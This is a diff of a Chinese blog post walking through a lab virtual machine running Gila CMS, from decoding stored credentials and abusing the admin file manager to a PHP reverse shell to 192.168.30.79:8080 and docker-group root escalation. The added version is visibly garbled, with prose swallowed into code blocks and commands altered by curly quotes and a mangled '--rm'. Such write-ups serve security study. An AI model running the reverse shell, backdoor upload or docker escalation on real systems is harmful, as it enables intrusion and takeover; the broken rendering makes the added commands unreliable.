@@ -125,33 +125,22 @@
 <p>爆破是贼慢，但是密码成功出来了，是family。打开是一个secret.txt文件，里面有一个类似base64加密的字符串。</p>
 <p><img src="https://i.loli.net/2019/11/15/rden5chWPaXNmzH.png" alt="1573716758046.png"></p>
 <p>字符串为以下，看起来是账号：邮箱：密码。不过遗憾的是，并不能登陆phpmyadmin。那这个字符串就可能是字段：账号：密码的形式。</p>
-<pre><code>Z2lsYTphZG1pbkBnbWFpbC5jb206cHJpbmNlc2E=
-解码为：
-gila:admin@gmail.com:princesa
-</code></pre><h2 id="利用已知漏洞"><a href="#利用已知漏洞" class="headerlink" title="利用已知漏洞"></a>利用已知漏洞</h2><p>后来试一下路径，发现存在这个一个地址，gila是一个cms。</p>
-<pre><code>http://192.168.120.138/gila/
-</code></pre><p><img src="https://i.loli.net/2019/11/15/C3tO6HmuqhbzSZj.png" alt="1573788590873.png"><br>到官方网站，找到了官方给的demo站，后台地址是加admin。尝试是否也是admin。</p>
-<pre><code>http://192.168.120.138/gila/admin
-</code></pre><p><img src="https://i.loli.net/2019/11/15/j2xpDA1v7XqBkoT.png" alt="1573788693246.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Z2lsYTphZG1pbkBnbWFpbC5jb206cHJpbmNlc2E=</span><br><span class="line">解码为：</span><br><span class="line">gila:admin@gmail.com:princesa</span><br></pre></td></tr></table></figure>
+<h2 id="利用已知漏洞"><a href="#利用已知漏洞" class="headerlink" title="利用已知漏洞"></a>利用已知漏洞</h2><p>后来试一下路径，发现存在这个一个地址，gila是一个cms。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.120.138/gila/</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2019/11/15/C3tO6HmuqhbzSZj.png" alt="1573788590873.png"><br>到官方网站，找到了官方给的demo站，后台地址是加admin。尝试是否也是admin。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.120.138/gila/admin</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2019/11/15/j2xpDA1v7XqBkoT.png" alt="1573788693246.png"></p>
 <p>登陆后，看到版本为1.10.9。基本可以确定是一个后台获取webshell的利用方式，搜索谷歌，查找一下是否有已知的漏洞。在exploit-db上找到了一个本地文件包含漏洞。尝试确实存在，而已可以上传文件。查看一下发现是content下的文件管理功能。</p>
-<pre><code>http://192.168.120.138/gila/admin/fm?f=./..
-</code></pre><p><img src="https://i.loli.net/2019/11/15/ig9yuJs3EHr7mpS.png" alt="1573788989941.png"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.120.138/gila/admin/fm?f=./..</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2019/11/15/ig9yuJs3EHr7mpS.png" alt="1573788989941.png"></p>
 <h3 id="利用上传文件"><a href="#利用上传文件" class="headerlink" title="利用上传文件"></a>利用上传文件</h3><p>创建新文件后门。在assert文件夹下，但是php文件不能访问，需要修改.htaccess文件。</p>
 <p><img src="https://i.loli.net/2019/11/15/HpAKf6RXyNrShJ2.png" alt="1573789346619.png"></p>
-<p>修改为<code>Allow from all</code>，即可访问上传的文件。</p>
-<p><img src="https://i.loli.net/2019/11/15/2jIiJDk3G4yagWz.png" alt="1573789391147.png"></p>
-<h2 id="反弹shell获取权限"><a href="#反弹shell获取权限" class="headerlink" title="反弹shell获取权限"></a>反弹shell获取权限</h2><p>利用php反弹shell</p>
-<pre><code>php -r &#39;$sock=fsockopen(&quot;192.168.30.79&quot;,8080);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;
-#升级shell
-python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39; 
-</code></pre><p><img src="https://i.loli.net/2019/11/15/L7qnsAzGgY3T9df.png" alt="1573798182649.png"></p>
-<p>从id命令看到www-data是docker组的成员，而docker是可以免密码操作sudo的。详细参考</p>
-<p><a href="https://www.freebuf.com/articles/system/170783.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/170783.html</a></p>
-<p>借助一个docker镜像，查看本机存在一个alpine镜像</p>
-<p><img src="https://i.loli.net/2019/11/15/QkOp8Kcxt6MnfBP.png" alt="1573799916611.png"></p>
-<p>采用-v的目录映射，此处修改为/root:/root，运行进入docker内部</p>
-<pre><code>docker run -it --rm -v /root:/root alpine
-</code></pre><p><img src="https://i.loli.net/2019/11/15/192nqWMVgFcBtrS.png" alt="1573800551863.png"></p>
+<p>修改为<figure class="highlight plain"><figcaption><span>from all```，即可访问上传的文件。</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![1573789391147.png](https://i.loli.net/2019/11/15/2jIiJDk3G4yagWz.png)</span><br><span class="line"></span><br><span class="line">## 反弹shell获取权限</span><br><span class="line"></span><br><span class="line">利用php反弹shell</span><br></pre></td></tr></table></figure></p>
+<p>php -r ‘$sock=fsockopen(“192.168.30.79”,8080);exec(“/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”);’</p>
+<p>#升级shell<br>python -c ‘import pty; pty.spawn(“/bin/bash”)’<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![1573798182649.png](https://i.loli.net/2019/11/15/L7qnsAzGgY3T9df.png)</span><br><span class="line"></span><br><span class="line">从id命令看到www-data是docker组的成员，而docker是可以免密码操作sudo的。详细参考</span><br><span class="line"></span><br><span class="line">https://www.freebuf.com/articles/system/170783.html</span><br><span class="line"></span><br><span class="line">借助一个docker镜像，查看本机存在一个alpine镜像</span><br><span class="line"></span><br><span class="line">![1573799916611.png](https://i.loli.net/2019/11/15/QkOp8Kcxt6MnfBP.png)</span><br><span class="line"></span><br><span class="line">采用-v的目录映射，此处修改为/root:/root，运行进入docker内部</span><br></pre></td></tr></table></figure></p>
+<p>docker run -it –rm -v /root:/root alpine<br><code>`</code></p>
+<p><img src="https://i.loli.net/2019/11/15/192nqWMVgFcBtrS.png" alt="1573800551863.png"></p>
 <p>找到root下的文件，打开即可</p>
 <p><img src="https://i.loli.net/2019/11/15/bBqVHw2TS7k3smR.png" alt="1573800574456.png"></p>
 
